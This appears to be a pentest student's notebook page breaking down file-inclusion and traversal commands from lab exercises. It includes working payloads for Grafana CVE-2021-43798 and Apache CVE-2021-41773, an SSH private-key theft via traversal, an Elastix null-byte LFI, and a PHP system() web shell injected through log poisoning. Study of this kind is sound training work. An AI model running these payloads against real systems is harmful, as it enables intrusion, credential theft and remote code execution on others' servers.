# File Inclusion & Traversal, Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. Directory traversal, LFI, and the encoding/wrapper tricks used to get past filters. See that page for the entry format.

---

## `--path-as-is` traversal through a bundled plugin path (Grafana CVE-2021-43798)

**Full command:**
```bash
curl --path-as-is "http://192.168.156.193:3000/public/plugins/alertlist/../../../../../../../../../../Users/install.txt"
```

**Piece by piece:**
- `public/plugins/alertlist/` → `alertlist` is a **core plugin bundled with every Grafana install**, not a guessed or brute-forced name. The bug lives in how Grafana resolves paths under any plugin directory, so picking a plugin that's guaranteed present (rather than one that might not be installed) means this payload works against any vulnerable Grafana instance without reconnaissance first.
- `../../../../../../../../../../` → the traversal itself, made unusually long here because the actual filesystem depth from a Windows Grafana install's plugin directory up to `C:\` is deep; extra leading `../` beyond the real root are harmless (they just resolve to the root again), so over-including is safer than under-including when the exact depth is unknown.
- `--path-as-is` → the actual point of failure without it. Curl **normalizes URLs by default**, silently collapsing `foo/../bar` down to `bar` locally before the request ever leaves your machine, exactly the cleanup a traversal payload depends on curl *not* doing. `--path-as-is` tells curl to send the literal path unchanged and let the *server's* buggy path handling do the escaping instead, which is where the actual vulnerability lives.

**Where this comes from:** the specific plugin name (`alertlist`) and traversal shape come from the public PoC for CVE-2021-43798, documented on both HackTricks and PayloadsAllTheThings' Grafana-specific entries, search either for the CVE number directly. General lesson: for any named CVE, look up the specific published PoC path rather than trying to rediscover the vulnerable endpoint from scratch.

**Where to look in the response:** Grafana returns the raw file content directly in the response body with no wrapping (no JSON, no HTML), so a successful hit looks exactly like `cat`-ing the file yourself. A failed attempt returns Grafana's normal JSON error body instead, that shape difference alone tells you success/failure without needing to grep for anything specific.

🔁 **Seen in:** [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|Common Web Application Attacks, 9.1.2]], Case study 2. Companion entry in [[File Inclusion & Traversal|Command Appendix]].

#### Tags: #DirectoryTraversal #Grafana #CVE202143798 #CurlPathAsIs #CommandBreakdowns

---

## Apache CVE-2021-41773's asymmetric first-segment encoding

**Full command:**
```bash
curl --path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**Piece by piece:**
- `%2e` → the percent-encoded form of a literal `.` character. Apache's vulnerable path-canonicalization code decodes `%2e` back into `.` **after** its own traversal filter already ran, so a filter that pattern-matches the literal string `../` never sees it, but Apache still honors the decoded result as a real `..` once the filter's been satisfied.
- `.%2e` (first segment only, not `%2e%2e`) → this is the specific, non-obvious part. The uniform "just encode every dot" version (`%2e%2e/%2e%2e/...`) that seems like the logical extension of the trick **doesn't reproduce on every vulnerable instance**. The published PoC for this exact CVE uses a mixed literal-dot-plus-encoded-dot form for the first segment specifically, an asymmetry that isn't derivable from "URL-encode the traversal," it's a quirk of exactly how Apache's own decoding routine walks the path string.
- `--path-as-is` → same reason as the Grafana entry above, curl would otherwise locally collapse the decoded-looking segments before sending.

**Where this comes from:** this exact payload shape is what's embedded in Nmap's `http-vuln-cve2021-41773` NSE script (see [[File Inclusion & Traversal (Breakdowns)#Renaming and re-indexing a downloaded NSE script to Nmap's naming convention|the NSE script entry]] below for how that script gets installed) and in the public GitHub PoCs for this CVE, both HackTricks and PayloadsAllTheThings mirror it under their Apache/CVE-specific entries. General lesson: when a well-known CVE's "obvious" simplified payload (uniform encoding at every segment) doesn't land, the real published PoC often has one small asymmetric detail worth hunting down rather than just varying depth/repetition.

**Where to look in the response:** a `404` means the payload didn't traverse at all (still being caught), not necessarily "not vulnerable," it might just be the wrong exact encoding. A `200` with `/etc/passwd`'s contents rendered as plain text confirms success. There's no error text to grep for here, this one's a binary success/fail by status code and body content, not a leaked error message.

🔁 **Seen in:** [[Common Web Application Attacks#9.1.3. Encoding Special Characters|Common Web Application Attacks, 9.1.3]] troubleshooting box. Companion entry in [[File Inclusion & Traversal|Command Appendix]].

#### Tags: #DirectoryTraversal #CVE202141773 #Apache #PercentEncoding #CommandBreakdowns

---

## `php://filter` base64-encode wrapper to read PHP source without executing it

**Full command:**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
```

**Piece by piece:**
- `php://filter` → not a file path at all, this is a PHP **stream wrapper**, a built-in protocol handler that changes what "include this path" even means to PHP. Normally, including a `.php` file executes it; a stream wrapper intercepts that and applies a transformation instead.
- `convert.base64-encode` → the filter being applied, and the actual mechanism that stops execution. It's not an evasion trick or obfuscation, it's structural: base64-encoded text is not valid PHP syntax, so the PHP interpreter can't execute it even if it tries. The file gets encoded *before* the include happens, so what actually gets "included" is inert text, not runnable code.
- `resource=admin.php` → the required parameter naming which file the filter chain applies to. Accepts absolute or relative paths, same as any other LFI target.
- The output you get back is base64, not source → needs a separate decode step (`base64 -d`) afterward. The raw curl response is intentionally unreadable until you pipe it through that.

**Where this comes from:** HackTricks' LFI page has a dedicated `php://filter` section listing every useful filter chain (not just base64, also rot13, compression filters, and chains that can be abused for LFI-to-RCE in specific PHP versions). PayloadsAllTheThings mirrors this under its File Inclusion payloads with more wrapper variants (`php://input`, `expect://`, `zip://`) worth trying when this specific one is disabled.

**Where to look in the response:** the entire response body IS the payload here, a long unbroken base64 string with no surrounding HTML (unlike a normal page render). If you instead see the *executed* output of the PHP file (a rendered page, possibly cut off mid-tag), the filter didn't apply, means either the `resource=` path is wrong or `php://filter` itself isn't reachable.

🔁 **Seen in:** [[Common Web Application Attacks#9.2.2. PHP Wrappers|Common Web Application Attacks, 9.2.2]], steps 1-4.

#### Tags: #LFI #PHPWrappers #Base64Filter #CommandBreakdowns

---

## `sed` range-pattern extraction of a multi-line secret from a raw HTTP response

**Full command:**
```bash
curl -s "http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa" -o ~/raw_response.txt
sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' ~/raw_response.txt > ~/dt_key
```

**Piece by piece:**
- `curl -s ... -o ~/raw_response.txt` → saves the full raw response to a file instead of printing it. This matters because the private key is embedded inside a full HTML page, mixed with markup before and after it, you need the whole thing captured intact before you can carve the key out of it.
- `sed -n '...' -p` → `-n` suppresses `sed`'s default behavior of printing every line, so only lines explicitly matched by `p` (print) make it to output.
- `/PATTERN1/,/PATTERN2/` → this is a **range match**, not a single substitution, the part most people haven't seen before. It tells `sed` "start printing the moment you see PATTERN1, keep printing every line after that, stop right after you see PATTERN2." It doesn't matter what's between them or how many lines that spans, the range handles a multi-line block as a single unit.
- Why this exists at all (not just "it's neater than copy-paste") → manually copying a multi-line base64 key out of a rendered browser page or terminal is an easy way to silently drop a character, and a truncated key still *looks* plausible at a glance while being completely unusable. `sed` extracting it mechanically from the saved raw bytes removes that failure mode entirely, no eyeballing required.

**Where this comes from:** this is a general Unix text-processing pattern (`sed`'s range-address syntax), not something specific to any exploit reference, GNU `sed`'s own manual covers range addressing under "Selecting lines by pattern." The specific *application* here (extracting a PEM-format key block) is a pattern worth remembering any time a vulnerability lets you read, rather than download, a multi-line secret.

**Where to look in the response:** don't look at the rendered page at all for this one, that's the point. Save straight to a file with `-o` and only inspect the saved file (or trust the `sed` extraction) rather than reading the key off a screen. If the extracted key still fails to connect, diff it against a second independent extraction rather than assuming the target/technique is broken.

🔁 **Seen in:** [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|Common Web Application Attacks, 9.1.2]], Step 6 note (the libcrypto troubleshooting saga).

#### Tags: #SSHKeyTheft #SedRangeMatch #MechanicalExtraction #CommandBreakdowns

---

## Elastix `graph.php` LFI: TLS downgrade, double-slash, and null-byte truncation stacked together

**Full command:**
```bash
curl -k --tlsv1.0 "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action" 2>/dev/null
```

**Piece by piece:**
- `-k --tlsv1.0` → nothing to do with the LFI itself, this is just getting curl to reach an old server at all. `-k` skips certificate validation (an old/self-signed cert on an ancient Elastix box), `--tlsv1.0` forces a deprecated TLS version because modern curl builds refuse to negotiate anything that old by default. Without both, the request fails before it ever tests the vulnerability.
- `../../../../../../../..//` → note the **double slash right before `etc`** (`..//etc`), not a typo. This specific exploit (Elastix 2.2.0 `graph.php` LFI, from the public PoC found via `searchsploit -x`) needs that exact double-slash to reach the vulnerable code path, a beginner's "cleaned up" single-slash version of the same payload may not trigger the bug the same way.
- `%00` → a **null-byte string terminator**. PHP versions before 5.3 (this box's era) treat `%00` as "the string ends here" when passed to certain filesystem functions written in C underneath, even though everything the *application* appended after it (like a hardcoded `.php` extension it expects `current_language` to end with) is still part of the URL. The null byte makes PHP's underlying file-open call ignore that trailing expected extension, letting `/etc/passwd` get opened as-is instead of `/etc/passwd.php` (which wouldn't exist).
- `&module=Accounts&action` → dummy trailing parameters with no traversal content of their own. They exist purely to keep the request's overall shape matching what the vulnerable script expects to receive, some vulnerable code paths only get reached when the request "looks like" a normal call to that script, missing expected parameters can route you into different (non-vulnerable) code before the traversal logic ever runs.

**Where this comes from:** the exact payload came from `searchsploit -x exploits/php/webapps/37637.pl`, the actual proof-of-concept script for this specific CVE, found via `searchsploit elastix` after fingerprinting the target as Elastix from earlier enumeration. General lesson: once you've matched a target to a known CVE via `searchsploit`, always read the actual PoC file (`-x` to examine it inline) rather than guessing at the payload shape from the exploit's title alone, the fiddly details (double slashes, null bytes, dummy params) live in the PoC, not in the one-line exploit-db title.

**Where to look in the response:** `/etc/passwd`'s contents come back as plain text in the response body, no wrapping, no error text to grep for. A failed attempt on an old/unpatched PHP install more often returns a blank body or the app's own generic error page rather than a helpful message, so success here is really "did the passwd-format content show up at all," not "does this particular string appear."

🔁 **Seen in:** [[4. Beep|4. Beep]], Step 11 (Phase 4: Local File Inclusion).

#### Tags: #LFI #NullByte #Elastix #TLSDowngrade #CommandBreakdowns

---

## Renaming and re-indexing a downloaded NSE script to Nmap's naming convention

**Full commands:**
```bash
sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
sudo nmap --script-updatedb
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
```

**Piece by piece:**
- Filename change from `http-vuln-cve-2021-41773.nse` (as downloaded) to `http-vuln-cve2021-41773.nse` (no dash before the year) → this is the entire point of the rename, and it's not cosmetic. Nmap's script database indexes scripts by exact filename, and its own naming convention for CVE scripts specifically omits the dash between "cve" and the year. A script saved under the wrong filename simply won't be found by `--script "http-vuln-cve2021-41773"` later, with no error explaining why, it just silently doesn't run.
- `sudo cp ... /usr/share/nmap/scripts/` → NSE only looks in this directory (plus a per-user equivalent) for custom scripts, dropping a `.nse` file elsewhere does nothing.
- `sudo nmap --script-updatedb` → a **mandatory separate step**, easy to forget. Nmap doesn't scan the scripts directory live on every run, it maintains a pre-built index (`script.db`), and a newly added script won't be recognized until this command rebuilds that index.
- `--script "http-vuln-cve2021-41773"` → the string here has to exactly match the script's declared `id` inside the `.nse` file's own metadata (which is derived from the filename minus extension), not just be "close enough."

**Where this comes from:** Nmap's own NSE documentation (`nmap.org/book/nse-usage.html`) covers the script directory location and the `--script-updatedb` requirement. The specific script itself is typically found via a GitHub search for `nmap nse cve-2021-41773` or similar, since NSE's own bundled scripts don't cover every CVE, custom community scripts fill that gap.

**Where to look in the response:** if the script silently doesn't appear to run at all (no output, no error), suspect the filename/index mismatch first before assuming the target isn't vulnerable, re-check `cat /usr/share/nmap/scripts/script.db | grep <script-name>` to confirm it's actually indexed.

🔁 **Seen in:** [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|Vulnerability Scanning, 7.3.2]]. Companion entry in [[Reconnaissance & Enumeration|Command Appendix]].

#### Tags: #Nmap #NSE #CVE202141773 #CommandBreakdowns

---

## LFI + log poisoning: why `access.log` and `User-Agent` specifically

**Full commands:**
```bash
curl "http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log"
```
then, in Burp Repeater, set the `User-Agent` header to `<?php echo system($_GET['cmd']); ?>` and send.

**Piece by piece:**
- **Why a log file at all** → this technique doesn't rely on any bug in the LFI itself, LFI just includes whatever file it's pointed at, and the *include* step **executes** `.php`-looking content instead of just displaying it (the same distinction the module draws between traversal and inclusion). A log file is attractive specifically because it's a file the attacker can partially control the *contents* of, from entirely outside the filesystem, just by sending a normal HTTP request.
- **Why `access.log` specifically** → Apache's default access log format records the `User-Agent` header **verbatim**, unescaped, for every single request, alongside the IP, timestamp, and requested path. It was never designed with "this field might later be interpreted as PHP" in mind, logging exists purely for diagnostics.
- **Why `User-Agent` as the injection point (not the IP or path)** → the IP is largely outside attacker control (spoofing it convincingly is a much bigger lift), and the request path is usually sanitized/normalized before logging. `User-Agent` is a free-text HTTP header the client sends verbatim and the server has no reason to validate or sanitize before writing to its own log, exactly the kind of field an app developer never expected to be "dangerous."
- **The two-step nature of the exploit** → poisoning (Step 1: send the PHP snippet as the header, it lands in the log as inert text at that point) and triggering (Step 2: LFI-include the now-poisoned log, which is the moment the PHP interpreter actually parses and runs that snippet) are genuinely separate actions. The log poisoning alone does nothing until something later *includes* that file as code.
- **Why this only works with LFI, not plain directory traversal** → per the module's own core distinction, traversal only ever **reads** a file's raw bytes back to you, it never hands them to the PHP interpreter. Reading a poisoned `access.log` via pure traversal would just show you your own injected `<?php ... ?>` text sitting there inert, exactly as harmless as it looks.

**Where this comes from:** log poisoning is a long-documented LFI-to-RCE technique, covered in depth on both HackTricks' and PayloadsAllTheThings' File Inclusion pages, including other log targets beyond Apache's `access.log` (PHP session files, SSH auth logs, mail logs), worth checking those pages if `access.log` isn't writable/readable on a specific target.

**Where to look in the response:** the poisoned log, once included, renders whatever your injected PHP's `echo`/`system()` call outputs directly into the page, mixed in with the log's own normal text (timestamps, other requests), the command output is usually easy to spot as the one line that doesn't look like a log entry.

🔁 **Seen in:** [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|Common Web Application Attacks, 9.2.1]].

#### Tags: #LogPoisoning #LFItoRCE #AccessLog #UserAgentInjection #CommandBreakdowns

---

## **Outstanding**
- [ ] `data://` wrapper base64 filter-evasion variant, RFI hosting mechanics.
